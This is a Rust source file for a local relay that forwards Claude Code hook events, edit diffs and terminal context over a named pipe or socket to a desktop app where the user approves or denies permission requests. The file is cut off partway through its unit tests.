//! nook-hook — the relay Claude Code runs on every hook event.
//!
//! Reads the hook JSON on stdin, adds a little terminal context, and hands it to
//! Nook over the named pipe `\\.\pipe\nook-<sid>` (Windows) or the Unix
//! socket `$XDG_RUNTIME_DIR/nook.sock` (Linux).
//!
//! Hard rule (docs/CLAUDE.md): **never block Claude Code.**
//! * If the pipe does not exist — Nook is closed — we exit 0 immediately with
//!   nothing on stdout, and the session carries on untouched.
//! * Every step runs under a deadline enforced by the main thread, so a pipe that
//!   accepts the connection and then stops reading cannot wedge the session
//!   either: we abandon the worker and exit.
//! * Only `PermissionRequest` waits for a human, because approving from the
//!   island — or answering Claude's question there — is the whole point. No
//!   answer means empty stdout, and Claude Code asks in its own window exactly
//!   as if Nook were not installed.
//!
//! Usage: `nook-hook <EventName>` (the name is also read from the JSON).
//! `nook-hook --where` is a diagnostic: see WHERE_FLAG.
//! `nook-hook statusline` is Claude Code's status line command: see statusline.rs.

use std::io::{Read, Write};
use std::sync::mpsc;
use std::time::Duration;

/// Budget for getting a pipe connection. Beyond this Claude Code wins, always.
const CONNECT_TIMEOUT: Duration = Duration::from_millis(300);
/// Whole-run budget for an event nobody waits on: connect and write, no more.
const FIRE_AND_FORGET_BUDGET: Duration = Duration::from_secs(2);
/// How long a permission prompt may stay on screen before the terminal takes over.
const DECISION_BUDGET: Duration = Duration::from_secs(110);

/// Fields that are pointless to forward and can be enormous (a whole file read,
/// a full command output). The island shows a few lines of them at most, and
/// those are taken out first.
const DROPPED_FIELDS: &[&str] = &["tool_response", "transcript_path", "agent_transcript_path"];
/// The tools that leave a file changed. What they did to it is the one part of
/// a tool's response the island shows.
const EDIT_TOOLS: &[&str] = &["Edit", "Write", "MultiEdit", "NotebookEdit"];
/// The tools that run a command: what it printed is what they have to show.
const COMMAND_TOOLS: &[&str] = &["Bash", "PowerShell"];
/// The tools that launch a subagent, by the name this version of Claude Code
/// gives it and the one older versions did.
const AGENT_TOOLS: &[&str] = &["Agent", "Task"];
/// An agent's id is a short run of hex; anything much longer is not one.
const MAX_AGENT_ID: usize = 64;
/// A model's id is a short name too (`claude-opus-5-5`, a provider's longer one).
const MAX_MODEL_ID: usize = 96;
/// Lines of a tool's result forwarded — the end of what a command printed, the
/// start of a file that was read — and the longest of them, in characters.
const MAX_RESULT_LINES: usize = 40;
const MAX_RESULT_LINE: usize = 240;
/// The tool Claude asks its questions with. Its input goes back whole, with the
/// answers added, so it is kept as it came.
const QUESTION_TOOL: &str = "AskUserQuestion";
/// Longest diff forwarded for one change, and longest line in it.
const MAX_PATCH: usize = 12_000;
const MAX_PATCH_LINE: usize = 400;
/// Largest file read to show what an edit would do to it.
const MAX_PROPOSAL_FILE: u64 = 2_000_000;
/// Unchanged lines kept on each side of a proposed change.
const CONTEXT_LINES: usize = 3;
/// How much of a transcript's end is read — for the conversation's title, and
/// for what Claude said last — and the events worth reading it on: a turn's
/// ends, not each of its tools.
const TRANSCRIPT_TAIL: u64 = 256 * 1024;
const TRANSCRIPT_EVENTS: &[&str] = &["SessionStart", "UserPromptSubmit", "Stop", "PermissionRequest"];
const MAX_TITLE: usize = 80;
/// Longest piece of Claude's last message forwarded with a Stop, in characters.
const MAX_LAST_MESSAGE: usize = 6_000;
/// Longest piece of what a subagent said last forwarded with its SubagentStop:
/// the island shows it as the subagent's result, a few lines of it.
const MAX_SUBAGENT_MESSAGE: usize = 2_000;
/// Longest string forwarded for any single field; the island truncates to far
/// less than this anyway.
const MAX_FIELD_LEN: usize = 2_000;
/// What a permission request is about — the command, the path, the URL — is
/// what its card shows and what a click allows, so it goes whole where every
/// other field is cut. Past this length it is not shown at all: the request
/// says it was cut, and the island sends it back to Claude Code's own prompt
/// rather than offer Allow on text nobody can read to its end.
const MAX_APPROVAL_TARGET: usize = 16_000;
/// The fields of a tool's input that say what it would do, the most telling
/// first. The island's APPROVAL_FIELDS (island/hooks.ts) is the same list in
/// the same order: the first of them a request carries is what its card shows.
const APPROVAL_FIELDS: &[&str] = &["command", "file_path", "path", "url", "query", "pattern", "prompt"];
/// What names the terminal a session runs in: the key it goes under, and the
/// environment variable it is read from. Context only — never a filter.
const ENV_CONTEXT: &[(&str, &str)] = &[
    ("term_program", "TERM_PROGRAM"),
    ("wt_session", "WT_SESSION"),
    ("term_session_id", "TERM_SESSION_ID"),
    ("vscode_pid", "VSCODE_PID"),
    ("session_pid", "CLAUDE_CODE_SSE_PORT"),
    // Which Claude Code this is: the desktop app, VS Code, the command line.
    ("entrypoint", "CLAUDE_CODE_ENTRYPOINT"),
];
/// The events that say where the session runs — the processes above the relay,
/// so the island's ↗ can bring the right window forward. A session does not
/// move between windows, and looking costs a snapshot of every process: it is
/// done when a session starts and when the user speaks to it, not on each tool.
const HOST_EVENTS: &[&str] = &["SessionStart", "UserPromptSubmit"];
/// How long that look may take. Past it the event goes without: where a
/// session runs is a convenience, and Claude Code never waits on one.
const HOST_BUDGET: Duration = Duration::from_millis(250);
/// The processes worth naming, by their image's name in lower case: terminals,
/// editors, shells, console hosts, Claude itself, and the desktop everything
/// starts from. Any other ancestor — a script runner, a wrapper — is left out:
/// what leaves the relay is a pid and one of these names, nothing else.
const HOST_NAMES: &[&str] = &[
    "windowsterminal.exe", "code.exe", "code - insiders.exe", "cursor.exe",
    "powershell.exe", "pwsh.exe", "cmd.exe", "conhost.exe", "openconsole.exe",
    "claude.exe", "explorer.exe",
];
/// Where the chain ends: everything started from the desktop has it above.
const DESKTOP: &str = "explorer.exe";
/// Ancestors looked at, and named, at most.
const MAX_ANCESTORS: usize = 16;
/// The diagnostic: `nook-hook --where` prints what the relay would say of the
/// place it is run from — the terminal context and the ancestors it would
/// report, plus the whole chain — as JSON on stdout, and exits. It reads no
/// stdin and sends nothing to Nook. Run it from the terminal a session is in
/// when the island's ↗ goes to the wrong window, or is not there.
const WHERE_FLAG: &str = "--where";

#[cfg(windows)]
mod win;
#[cfg(windows)]
use win::connect;

#[cfg(target_os = "linux")]
mod unix;
#[cfg(target_os = "linux")]
use unix::connect;

mod cursor;
mod statusline;

fn main() {
    // Claude Code's status line command, not a hook: a mode of its own, which
    // has its own rules about what is sent and what is printed.
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.first().is_some_and(|arg| arg == statusline::MODE) {
        statusline::run(&args[1..]);
    }
    if args.iter().any(|arg| arg == WHERE_FLAG) {
        println!("{}", where_json());
        return;
    }
    let Some(Event { line: payload, name: event, tool_input }) = read_event() else { std::process::exit(0) };

    // Only a permission request waits for a human, so only it gets the long budget.
    let waits_for_answer = event == "PermissionRequest";
    let budget = if waits_for_answer { DECISION_BUDGET } else { FIRE_AND_FORGET_BUDGET };

    // The worker owns every blocking call. If it overruns the budget we simply
    // stop listening and exit: the process dying takes the pipe handle with it.
    // (No catch_unwind here — the release profile is panic = "abort", so it would
    // be dead code. `talk` is written to have nothing to panic on instead.)
    let (tx, rx) = mpsc::channel::<Option<String>>();
    std::thread::spawn(move || {
        let _ = tx.send(talk(&payload, waits_for_answer));
    });

    if let Ok(Some(answer)) = rx.recv_timeout(budget) {
        // Cursor's events are never answered: whatever the app said, Cursor gets silence.
        if std::env::args().any(|arg| arg == cursor::TOOL) { std::process::exit(0); }
        if let Some(json) = reply_json(&answer, tool_input.as_ref()) {
            let mut out = std::io::stdout();
            let _ = writeln!(out, "{json}");
            let _ = out.flush();
        }
    }
    // Nothing printed: Claude Code asks in the terminal, as if we were not here.
    std::process::exit(0);
}

/// The documented PermissionRequest output. Anything we do not recognise prints
/// nothing at all rather than guessing — silence is the safe answer.
/// See https://code.claude.com/docs/en/hooks
fn decision_json(decision: &str) -> Option<String> {
    let behavior = match decision.trim() {
        "allow" => r#"{"behavior":"allow"}"#.to_string(),
        "deny" => r#"{"behavior":"deny","message":"Denied from Nook"}"#.to_string(),
        // A question the user chose not to answer: Claude is told so, and decides
        // what to do without the answer.
        "skip" => r#"{"behavior":"deny","message":"The user skipped this question from Nook, without answering it."}"#.to_string(),
        _ => return None,
    };
    Some(format!(
        r#"{{"hookSpecificOutput":{{"hookEventName":"PermissionRequest","decision":{behavior}}}}}"#
    ))
}

/// What Nook said about a permission request, as the JSON Claude Code
/// expects. Besides the bare `allow` and `deny`, one line carries something:
/// `answer {…}`, for Claude's question tool — the answers picked on the island,
/// keyed by question.
fn reply_json(answer: &str, tool_input: Option<&serde_json::Value>) -> Option<String> {
    let answer = answer.trim();
    match answer.strip_prefix("answer ") {
        Some(answers) => answered_json(answers, tool_input?),
        None => decision_json(answer),
    }
}

/// Allows the question tool with its input as Claude sent it plus `answers`:
/// the tool then returns them as if they had been picked in Claude Code.
fn answered_json(answers: &str, tool_input: &serde_json::Value) -> Option<String> {
    let answers = serde_json::from_str::<serde_json::Value>(answers).ok()?;
    if !answers.is_object() {
        return None;
    }
    let mut input = tool_input.as_object()?.clone();
    input.insert("answers".into(), answers);
    let input = serde_json::Value::Object(input);
    Some(format!(
        r#"{{"hookSpecificOutput":{{"hookEventName":"PermissionRequest","decision":{{"behavior":"allow","updatedInput":{input}}}}}}}"#
    ))
}

/// A unified diff being written: capped in length, its lines counted whole.
#[derive(Default)]
struct Patch {
    text: String,
    additions: u64,
    deletions: u64,
    truncated: bool,
}

impl Patch {
    fn hunk(&mut self, old_start: usize, old_lines: usize, new_start: usize, new_lines: usize) {
        self.text.push_str(&format!("@@ -{old_start},{old_lines} +{new_start},{new_lines} @@\n"));
    }

    /// One line with its sign. Past the cap it is still counted, no longer kept.
    fn push(&mut self, sign: char, line: &str) {
        match sign {
            '+' => self.additions += 1,
            '-' => self.deletions += 1,
            _ => {}
        }
        if self.truncated || self.text.len() + line.len() > MAX_PATCH {
            self.truncated = true;
            return;
        }
        let mut end = line.len().min(MAX_PATCH_LINE);
        while !line.is_char_boundary(end) {
            end -= 1;
        }
        self.text.push(sign);
        self.text.push_str(&line[..end]);
        self.text.push('\n');
    }

    fn json(self, created: bool) -> serde_json::Value {
        serde_json::json!({
            "patch": self.text, "additions": self.additions, "deletions": self.deletions,
            "truncated": self.truncated, "created": created,
        })
    }
}

/// The unified diff of what an edit tool did, from the hunks Claude Code puts in
/// its response — with the lines' real numbers, which the tool's input has not.
/// A file written new has no hunk: its content is the diff.
fn change_of(response: &serde_json::Value) -> Option<serde_json::Value> {
    let mut patch = Patch::default();
    let hunks = response.get("structuredPatch").and_then(|v| v.as_array());
    let created = response.get("type").and_then(|v| v.as_str()) == Some("create");
    match hunks {
        Some(hunks) if !hunks.is_empty() => {
            for hunk in hunks {
                let n = |key: &str| hunk.get(key).and_then(|v| v.as_u64()).unwrap_or(0) as usize;
                patch.hunk(n("oldStart"), n("oldLines"), n("newStart"), n("newLines"));
                for line in hunk.get("lines").and_then(|v| v.as_array()).into_iter().flatten() {
                    let line = line.as_str().unwrap_or_default();
                    let mut chars = line.chars();
                    patch.push(chars.next().unwrap_or(' '), chars.as_str());
                }
            }
        }
        _ if created => {
            let content = response.get("content").and_then(|v| v.as_str())?;
            patch.hunk(0, 0, 1, content.lines().count());
            for line in content.lines() {
                patch.push('+', line);
            }
        }
        _ => return None,
    }
    Some(patch.json(created))
}

/// A few lines of what a tool gave back, for the island to show under the
/// step: the end of what a command printed, the start of a file that was read,
/// what a search found. Nothing else of a tool's response leaves the relay.
fn result_of(tool: &str, response: &serde_json::Value) -> Option<serde_json::Value> {
    let text = |key: &str| response.get(key).and_then(|v| v.as_str()).unwrap_or_default();
    let names = || {
        let files = response.get("filenames").and_then(|v| v.as_array());
        files.into_iter().flatten().filter_map(|v| v.as_str()).collect::<Vec<_>>().join("\n")
    };
    match tool {
        _ if COMMAND_TOOLS.contains(&tool) => {
            let printed = [text("stdout"), text("stderr")].iter().filter(|s| !s.trim().is_empty()).cloned().collect::<Vec<_>>().join("\n");
            excerpt(&plain(&printed), None, true)
        }
        "Read" => {
            let file = response.get("file")?;
            let start = file.get("startLine").and_then(|v| v.as_u64()).unwrap_or(1);
            excerpt(file.get("content")?.as_str()?, Some(start), false)
        }
        "Grep" if !text("content").trim().is_empty() => excerpt(text("content"), None, false),
        "Grep" | "Glob" => excerpt(&names(), None, false),
        _ => None,
    }
}

/// The first lines of a text, or its last when `tail` — what a command ends
/// on is what it has to say. `start` is the number of the first line, for a file.
fn excerpt(text: &str, start: Option<u64>, tail: bool) -> Option<serde_json::Value> {
    let lines: Vec<&str> = text.trim_end().lines().collect();
    if lines.iter().all(|line| line.trim().is_empty()) {
        return None;
    }
    let truncated = lines.len() > MAX_RESULT_LINES;
    let kept = if tail { &lines[lines.len().saturating_sub(MAX_RESULT_LINES)..] } else { &lines[..lines.len().min(MAX_RESULT_LINES)] };
    let kept: Vec<String> = kept.iter().map(|line| clip(line.trim_end(), MAX_RESULT_LINE)).collect();
    Some(serde_json::json!({ "text": kept.join("\n"), "start": start, "truncated": truncated, "tail": tail }))
}

/// What a command printed without the escape sequences that colour it in a terminal.
fn plain(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    let mut chars = text.chars().peekable();
    while let Some(c) = chars.next() {
        if c != '\u{1b}' {
            out.push(c);
            continue;
        }
        // ESC [ … up to the letter that ends the sequence; a lone ESC just goes.
        if chars.peek() == Some(&'[') {
            chars.next();
            for c in chars.by_ref() {
                if ('@'..='~').contains(&c) {
                    break;
                }
            }
        }
    }
    out
}

/// The id of the subagent an `Agent` call launched, from the call's response:
/// what ties the call — and the task it describes — to the subagent's own
/// events, which carry the same id as `agent_id`.
fn launched_agent_of(response: &serde_json::Value) -> Option<String> {
    let id = response.get("agentId")?.as_str()?.trim();
    (!id.is_empty() && id.chars().count() <= MAX_AGENT_ID).then(|| id.to_string())
}

/// The model the subagent an `Agent` call launched runs on, from the call's
/// response: an id such as `claude-opus-5-5`. Only what an id is made of, and
/// short — anything else is not one, and is not sent.
fn launched_model_of(response: &serde_json::Value) -> Option<String> {
    let model = response.get("resolvedModel")?.as_str()?.trim();
    let plain = model.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | ':' | '[' | ']' | '@' | '/'));
    (!model.is_empty() && model.len() <= MAX_MODEL_ID && plain).then(|| model.to_string())
}

/// Whether the subagent an `Agent` call launched went on in the background:
/// the call then comes back at once, while the subagent is at work. Otherwise
/// the call waited for it, and comes back once it has stopped.
fn launched_in_background(response: &serde_json::Value) -> bool {
    response.get("isAsync").and_then(|v| v.as_bool()) == Some(true)
        || response.get("status").and_then(|v| v.as_str()) == Some("async_launched")
}

/// The file as Claude Code reads it: text, with Unix line ends. None when it
/// is not there, or too large to be worth showing a diff of.
fn read_text(path: &str) -> Option<String> {
    let size = std::fs::metadata(path).ok()?.len();
    if size > MAX_PROPOSAL_FILE {
        return None;
    }
    let bytes = std::fs::read(path).ok()?;
    Some(String::from_utf8_lossy(&bytes).replace("\r\n", "\n"))
}

/// One edit applied to a text, the way the Edit tool applies it.
fn apply(text: &str, edit: &serde_json::Value) -> Option<String> {
    let old = edit.get("old_string")?.as_str()?;
    let new = edit.get("new_string")?.as_str()?;
    if old.is_empty() || !text.contains(old) {
        return None;
    }
    let all = edit.get("replace_all").and_then(|v| v.as_bool()).unwrap_or(false);
    Some(if all { text.replace(old, new) } else { text.replacen(old, new, 1) })
}

/// What changes between two texts, as one hunk: the lines they share at both
/// ends are left out but for a few of context, and everything between is old
/// then new. Not the shortest diff there is — the honest one a relay can afford.
fn diff_of(before: &str, after: &str, created: bool) -> Option<serde_json::Value> {
    let a: Vec<&str> = before.lines().collect();
    let b: Vec<&str> = after.lines().collect();
    let mut head = 0;
    while head < a.len() && head < b.len() && a[head] == b[head] {
        head += 1;
    }
    let mut tail = 0;
    while tail < a.len() - head && tail < b.len() - head && a[a.len() - 1 - tail] == b[b.len() - 1 - tail] {
        tail += 1;
    }
    let (a_end, b_end) = (a.len() - tail, b.len() - tail);
    if head == a_end && head == b_end {
        return None;
    }
    let from = head.saturating_sub(CONTEXT_LINES);
    let after_lines = tail.min(CONTEXT_LINES);
    let (old_lines, new_lines) = (a_end - from + after_lines, b_end - from + after_lines);
    let mut patch = Patch::default();
    // A side with no line starts at 0, as `diff` writes it.
    patch.hunk(if old_lines == 0 { 0 } else { from + 1 }, old_lines, if new_lines == 0 { 0 } else { from + 1 }, new_lines);
    a[from..head].iter().for_each(|l| patch.push(' ', l));
    a[head..a_end].iter().for_each(|l| patch.push('-', l));
    b[head..b_end].iter().for_each(|l| patch.push('+', l));
    a[a_end..a_end + after_lines].iter().for_each(|l| patch.push(' ', l));
    Some(patch.json(created))
}

/// What an edit asking for permission would do to its file: the file as it is,
/// the edit applied to a copy, and the diff between the two. Nothing is written.
fn proposal_of(tool: &str, input: &serde_json::Value) -> Option<serde_json::Value> {
    let path = input.get("file_path")?.as_str()?;
    let before = read_text(path);
    let exists = std::path::Path::new(path).exists();
    let after = match tool {
        "Write" if before.is_some() || !exists => input.get("content")?.as_str()?.replace("\r\n", "\n"),
        "Edit" => apply(before.as_deref()?, input)?,
        "MultiEdit" => input
            .get("edits")?
            .as_array()?
            .iter()
            .try_fold(before.clone()?, |text, edit| apply(&text, edit))?,
        _ => return None,
    };
    diff_of(before.as_deref().unwrap_or_default(), &after, !exists)
}

/// The conversation's title, as Claude Code last wrote it in the session's
/// transcript. That file's format is Claude Code's own and may change: whatever
/// goes wrong here, there is simply no title. Only the file's end is read — a
/// long session's transcript runs to hundreds of megabytes.
fn title_of(tail: &str) -> Option<String> {
    tail.lines().rev().find_map(title_in)
}

/// The end of a session's transcript, as text.
fn tail_of(transcript: &str) -> Option<String> {
    use std::io::{Seek, SeekFrom};
    let mut file = std::fs::File::open(transcript).ok()?;
    let size = file.metadata().ok()?.len();
    file.seek(SeekFrom::Start(size.saturating_sub(TRANSCRIPT_TAIL))).ok()?;
    let mut tail = Vec::new();
    file.read_to_end(&mut tail).ok()?;
    Some(String::from_utf8_lossy(&tail).into_owned())
}

/// What Claude said last, from the transcript's end: the text of its last
/// message that has any. Read the same forgiving way as the title.
fn last_message_of(tail: &str) -> Option<String> {
    tail.lines().rev().find_map(said_in)
}

/// The text of an assistant's line of the transcript, if it says anything.
fn said_in(line: &str) -> Option<String> {
    if !line.contains("\"assistant\"") {
        return None;
    }
    let entry = serde_json::from_str::<serde_json::Value>(line).ok()?;
    if entry.get("type")?.as_str()? != "assistant" {
        return None;
    }
    let text = entry
        .pointer("/message/content")?
        .as_array()?
        .iter()
        .filter(|block| block.get("type").and_then(|v| v.as_str()) == Some("text"))
        .filter_map(|block| block.get("text")?.as_str())
        .collect::<Vec<_>>()
        .join("\n\n");
    let text = text.trim();
    (!text.is_empty()).then(|| clip(text, MAX_LAST_MESSAGE))
}

/// The first `max` characters, with a mark when some were left out.
fn clip(text: &str, max: usize) -> String {
    let mut out: String = text.chars().take(max).collect();
    if text.chars().nth(max).is_some() {
        out.push('…');
    }
    out
}

/// The title a transcript line carries, if it is one that names the conversation.
fn title_in(line: &str) -> Option<String> {
    if !line.contains("-title\"") && !line.contains("\"summary\"") {
        return None;
    }
    let entry = serde_json::from_str::<serde_json::Value>(line).ok()?;
    let title = match entry.get("type")?.as_str()? {
        "custom-title" => entry.get("customTitle"),
        "ai-title" => entry.get("aiTitle"),
        "summary" => entry.get("summary"),
        _ => None,
    }?
    .as_str()?
    .trim();
    (!title.is_empty()).then(|| title.chars().take(MAX_TITLE).collect())
}

/// One hook event, ready to go: the line for Nook, its name, and — for
/// Claude's question tool only — its input exactly as it came.
struct Event {
    line: String,
    name: String,
    tool_input: Option<serde_json::Value>,
}

/// Reads stdin and returns the payload to forward plus the event name.
fn read_event() -> Option<Event> {
    let mut raw = Vec::new();
    if std::io::stdin().read_to_end(&mut raw).is_err() || raw.is_empty() {
        return None;
    }
    // Some shells hand us a UTF-8 BOM; serde_json would choke on it.
    if raw.starts_with(&[0xEF, 0xBB, 0xBF]) {
        raw.drain(..3);
    }

    // Parse argv: "nook-hook.exe [--agent <name>] [<EventName>]"
    // --agent tags the payload with nook_agent so the app routes to the right pill.
    // Absent or invalid names are validated and discarded by the app, not here.
    let mut agent = String::new();
    let mut arg_event = String::new();
    {
        let mut it = std::env::args().skip(1);
        while let Some(arg) = it.next() {
            if arg == "--agent" {
                agent = it.next().unwrap_or_default();
            } else if arg_event.is_empty() {
                arg_event = arg;
            }
        }
    }
    let mut payload = serde_json::from_slice::<serde_json::Value>(&raw).ok()?;
    // Cursor's own hooks: translated into the event they stand for. Status
    // only, so nothing here ever waits for an answer or prints one.
    if agent == cursor::TOOL {
        return event_of(cursor::translate(&payload, &arg_event)?, String::new(), String::new());
    }
    // A Claude Code hook that Cursor ran: Cursor's session, or nothing at all.
    if agent.is_empty() && cursor::runs_in_cursor() && !cursor::from_claude_hooks(&mut payload) {
        return None;
    }
    event_of(payload, agent, arg_event)
}

/// What Claude Code sent, as it goes to Nook: what the island shows lifted out
/// of the fields too large to forward, those dropped, every string capped.
fn event_of(mut payload: serde_json::Value, agent: String, arg_event: String) -> Option<Event> {
    let map = payload.as_object_mut()?;
    // Which agent this hook was installed for. Absent means Claude Code,
    // so existing hook commands keep working unchanged.
    if !agent.is_empty() {
        map.insert("nook_agent".into(), serde_json::Value::String(agent));
    }
    let event = map
        .get("hook_event_name")
        .and_then(|v| v.as_str())
        .map(str::to_string)
        .filter(|s| !s.is_empty())
        .unwrap_or(arg_event);
    map.insert("hook_event_name".into(), serde_json::Value::String(event.clone()));

    let tool = map.get("tool_name").and_then(|v| v.as_str()).unwrap_or_default().to_string();
    // Before anything is cut or dropped: what an edit did, and a question whole.
    let change = (event == "PostToolUse" && EDIT_TOOLS.contains(&tool.as_str()))
        .then(|| map.get("tool_response").and_then(change_of))
        .flatten();
    // A few lines of what the tool gave back, to show under its step.
    let result = (event == "PostToolUse")
        .then(|| map.get("tool_response").and_then(|response| result_of(&tool, response)))
        .flatten();
    let tool_input = (tool == QUESTION_TOOL).then(|| map.get("tool_input").cloned()).flatten();
    // A question that got its answers, wherever they were picked: the island's
    // journal shows them under the question.
    let answers = (event == "PostToolUse" && tool == QUESTION_TOOL)
        .then(|| map.get("tool_response").and_then(|response| response.get("answers")).filter(|v| v.is_object()).cloned())
        .flatten();
    if let Some(answers) = answers {
        map.insert("answers".into(), answers);
    }
    // A subagent launched: its id, which its own events carry from then on.
    let launched = (event == "PostToolUse" && AGENT_TOOLS.contains(&tool.as_str()))
        .then(|| map.get("tool_response").and_then(launched_agent_of))
        .flatten();
    let launched_async = launched.is_some() && map.get("tool_response").is_some_and(launched_in_background);
    // And the model it runs on, which the island shows next to it.
    let launched_model = launched.as_ref().and_then(|_| map.get("tool_response").and_then(launched_model_of));
    // An edit asking for permission: what it would do, to look at before allowing.
    let proposal = (event == "PermissionRequest" && EDIT_TOOLS.contains(&tool.as_str()))
        .then(|| map.get("tool_input").and_then(|input| proposal_of(&tool, input)))
        .flatten();

    let tail = TRANSCRIPT_EVENTS
        .contains(&event.as_str())
        .then(|| map.get("transcript_path").and_then(|v| v.as_str()).and_then(tail_of))
        .flatten();
    let title = tail.as_deref().and_then(title_of);
    // A turn ends: what Claude said to end it. Claude Code hands it over when
    // it can; the transcript has it otherwise.
    // A subagent ends the same way, with less to say — and only on Claude
    // Code's word: the transcript at hand is the session's, not the subagent's.
    let said = |max: usize| {
        map.get("last_assistant_message")
            .and_then(|v| v.as_str())
            .map(|text| clip(text.trim(), max))
            .filter(|text| !text.is_empty())
    };
    let last_message = match event.as_str() {
        "Stop" => said(MAX_LAST_MESSAGE).or_else(|| tail.as_deref().and_then(last_message_of)),
        "SubagentStop" => said(MAX_SUBAGENT_MESSAGE),
        _ => None,
    };
    map.remove("last_assistant_message");

    for field in DROPPED_FIELDS {
        map.remove(*field);
    }

    let cwd_missing = map
        .get("cwd")
        .and_then(|v| v.as_str())
        .map(str::is_empty)
        .unwrap_or(true);
    if cwd_missing {
        if let Ok(cwd) = std::env::current_dir() {
            map.insert(
                "cwd".into(),
                serde_json::Value::String(cwd.to_string_lossy().to_string()),
            );
        }
    }

    // Which terminal the session runs in. Unlike macOS, Nook here accepts
    // events from every terminal, so this is context only — never a filter.
    for (key, var) in ENV_CONTEXT {
        if !map.contains_key(*key) {
            let value = std::env::var(var).unwrap_or_default();
            map.insert((*key).into(), serde_json::Value::String(value));
        }
    }
    // Where the session runs, when this is an event that says so. Whatever is
    // on the wire under that name is ours or nothing: Claude Code sends none.
    map.remove("ancestors");
    let host = HOST_EVENTS.contains(&event.as_str()).then(chain_within_budget).and_then(|chain| reported(&chain));
    if let Some(host) = host {
        map.insert("ancestors".into(), host);
    }

    // What the card of a permission request shows, kept from the cut below.
    let target = (event == "PermissionRequest").then(|| approval_target(map)).flatten();

    truncate_strings(&mut payload);
    if let Some((field, value)) = target {
        keep_target(&mut payload, field, value);
    }
    // After the cut: a diff is already capped, and far longer than a field.
    if let Some(change) = change {
        payload["change"] = change;
    }
    if let Some(proposal) = proposal {
        payload["proposal"] = proposal;
    }
    if let Some(result) = result {
        payload["result"] = result;
    }
    if let Some(id) = launched {
        payload["launched_agent"] = serde_json::Value::String(id);
        payload["launched_async"] = serde_json::Value::Bool(launched_async);
        if let Some(model) = launched_model {
            payload["launched_model"] = serde_json::Value::String(model);
        }
    }
    if let Some(title) = title {
        payload["session_title"] = serde_json::Value::String(title);
    }
    if let Some(text) = last_message {
        payload["last_message"] = serde_json::Value::String(text);
    }

    let mut line = payload.to_string();
    line.push('\n');
    Some(Event { line, name: event, tool_input })
}

/// A process above the relay: its id, and the name of its image — never a path.
#[derive(Clone, Debug, PartialEq)]
struct Proc {
    pid: u32,
    name: String,
}

/// The processes above this one, nearest first; none where they are not looked at.
#[cfg(windows)]
fn chain() -> Vec<Proc> {
    win::ancestors(MAX_ANCESTORS)
}

/// On Linux the island goes by the terminal's environment alone.
#[cfg(not(windows))]
fn chain() -> Vec<Proc> {
    Vec::new()
}

/// The chain, or nothing if it is not there in time: the look runs on a thread
/// of its own, left behind when it is slow.
fn chain_within_budget() -> Vec<Proc> {
    let (tx, rx) = mpsc::channel();
    std::thread::spawn(move || {
        let _ = tx.send(chain());
    });
    rx.recv_timeout(HOST_BUDGET).unwrap_or_default()
}

/// What of a chain leaves the relay: the ancestors whose name is one of
/// HOST_NAMES, nearest first, each as `{ pid, name }`, down to the desktop and
/// no further. None when there is nobody to name.
fn reported(chain: &[Proc]) -> Option<serde_json::Value> {
    let mut named = Vec::new();
    for ancestor in chain.iter().take(MAX_ANCESTORS) {
        let name = ancestor.name.to_lowercase();
        if ancestor.pid == 0 || !HOST_NAMES.contains(&name.as_str()) {
            continue;
        }
        named.push(serde_json::json!({ "pid": ancestor.pid, "name": ancestor.name }));
        if name == DESKTOP {
            break;
        }
    }
    (!named.is_empty()).then(|| serde_json::Value::Array(named))
}

/// What `--where` prints: the terminal context and the ancestors an event
/// would carry, and — for whoever reads it, it is sent nowhere — the whole chain.
fn where_json() -> String {
    let chain = chain_within_budget();
    let env: serde_json::Map<String, serde_json::Value> = ENV_CONTEXT
        .iter()
        .map(|(key, var)| ((*key).to_string(), serde_json::Value::String(std::env::var(var).unwrap_or_default())))
        .collect();
    let all: Vec<serde_json::Value> = chain.iter().map(|p| serde_json::json!({ "pid": p.pid, "name": p.name })).collect();
    let out = serde_json::json!({
        "env": env,
        "ancestors": reported(&chain).unwrap_or_else(|| serde_json::json!([])),
        "chain": all,
    });
    serde_json::to_string_pretty(&out).unwrap_or_default()
}

/// What a permission request asks to do, when it is too long to survive the
/// cut every field gets: the field it is in, and its text as it came.
fn approval_target(map: &serde_json::Map<String, serde_json::Value>) -> Option<(&'static str, String)> {
    let input = map.get("tool_input")?.as_object()?;
    let (field, value) = APPROVAL_FIELDS
        .iter()
        .find_map(|field| Some((*field, input.get(*field)?.as_str().filter(|s| !s.trim().is_empty())?)))?;
    (value.len() > MAX_FIELD_LEN).then(|| (field, value.to_string()))
}

/// Puts back, whole, what the card shows — or says it could not be: a request
/// marked `target_truncated` is one the island must not offer to allow.
fn keep_target(payload: &mut serde_json::Value, field: &str, value: String) {
    if value.len() > MAX_APPROVAL_TARGET {
        payload["target_truncated"] = serde_json::Value::Bool(true);
    } else {
        payload["tool_input"][field] = serde_json::Value::String(value);
    }
}

/// Caps every string in the payload. A single Write can carry a whole file.
fn truncate_strings(value: &mut serde_json::Value) {
    match value {
        serde_json::Value::String(s) => {
            if s.len() > MAX_FIELD_LEN {
                // Cut on a char boundary; a lone byte index can split UTF-8.
                let mut end = MAX_FIELD_LEN;
                while end > 0 && !s.is_char_boundary(end) {
                    end -= 1;
                }
                s.truncate(end);
                s.push('…');
            }
        }
        serde_json::Value::Array(items) => items.iter_mut().for_each(truncate_strings),
        serde_json::Value::Object(map) => map.values_mut().for_each(truncate_strings),
        _ => {}
    }
}

/// Connect, send, and — for a permission request — wait for the island's word.
fn talk(payload: &str, waits_for_answer: bool) -> Option<String> {
    let mut pipe = connect()?;

    if pipe.write_all(payload.as_bytes()).is_err() {
        return None;
    }
    let _ = pipe.flush();

    if !waits_for_answer {
        return None;
    }

    let mut buf = Vec::new();
    let mut chunk = [0u8; 1024];
    loop {
        match pipe.read(&mut chunk) {
            Ok(0) => break,
            Ok(n) => {
                buf.extend_from_slice(&chunk[..n]);
                if buf.contains(&b'\n') {
                    break;
                }
            }
            Err(_) => break,
        }
    }
    let answer = String::from_utf8_lossy(&buf).trim().to_string();
    (!answer.is_empty()).then_some(answer)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn decision_json_matches_the_documented_shape() {
        assert_eq!(
            decision_json("allow").unwrap(),
            r#"{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}"#
        );
        assert_eq!(
            decision_json("deny").unwrap(),
